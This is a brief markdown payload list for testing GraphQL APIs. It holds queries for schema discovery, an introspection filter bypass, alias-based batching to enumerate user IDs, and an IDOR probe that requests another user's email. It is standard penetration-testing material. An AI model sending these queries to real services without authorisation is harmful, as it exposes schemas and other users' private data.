# GraphQL Payload Collection

## Universal Query

query{
__typename
}

---

## Introspection Probe

{
"query":"{__schema{queryType{name}}}"
}

---

## Introspection Bypass

query{
__schema
{
queryType{
name
}
}
}

---

## Alias Abuse

query{
u1:user(id:1){id}
u2:user(id:2){id}
u3:user(id:3){id}
}

---

## IDOR Test

query{
user(id:2){
id
email
}
}